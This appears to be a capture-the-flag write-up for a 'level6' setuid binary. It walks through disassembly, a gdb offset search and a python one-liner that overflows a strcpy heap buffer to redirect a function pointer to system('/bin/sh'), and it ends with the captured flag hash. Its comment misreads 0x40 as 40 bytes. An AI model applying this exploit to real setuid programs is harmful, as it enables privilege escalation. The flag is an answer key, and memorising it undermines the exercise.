```shell
$> ls -la
[...]
-rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6
[...]

$> ./level6
Segmentation fault (core dumped)

$> ./level6 test
Nope

# program asks for an argument and shows a message "Nope"
```

```shell
$> objdump -d -M intel level6
[...]
08048454 <n>:       #1
    [...]
    804845a:       c7 04 24 b0 85 04 08    mov    DWORD PTR [esp],0x80485b0
    8048461:       e8 0a ff ff ff          call   8048370 <system@plt>
    [...]
[...]
08048468 <m>:       #2
    [...]
    804846e:       c7 04 24 d1 85 04 08    mov    DWORD PTR [esp],0x80485d1
    8048475:       e8 e6 fe ff ff          call   8048360 <puts@plt>
    [...]
[...]
0804847c <main>:    #3
    [...]
    8048485:       c7 04 24 40 00 00 00    mov    DWORD PTR [esp],0x40
    804848c:       e8 bf fe ff ff          call   8048350 <malloc@plt>
    [...]
    8048495:       c7 04 24 04 00 00 00    mov    DWORD PTR [esp],0x4
    804849c:       e8 af fe ff ff          call   8048350 <malloc@plt>
    [...]
    80484a5:       ba 68 84 04 08          mov    edx,0x8048468
    [...]
    80484c5:       e8 76 fe ff ff          call   8048340 <strcpy@plt>
    [...]
[...]

#1: function n() call system("/bin/sh")
#2: function m() call puts("Nope")
#3: function main() call 2 times malloc, one with 40 bytes and second with 4 bytes
#   And a pointer function calls m()
#   And a function strcpy(), copy the argv[1] to the memory allocated by malloc(40)
```

Because the function strcpy() is not a security function, it don't check the buffer size.  
So we can overflow the buffer memory and access to the next malloc memory and place n() instead of m().

```shell
$> gdb -q level6
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Starting program: /home/user/level6/level6 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x41346341 in ?? ()

# use Buffer Overflow EIP Offset String Generator, we can know the offset of the EIP is 72 bytes
```

```shell
$> python -c "print '\x90' * 72 + '\x54\x84\x04\x08'" > /tmp/exploit

$> ./level6 $(cat /tmp/exploit)
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```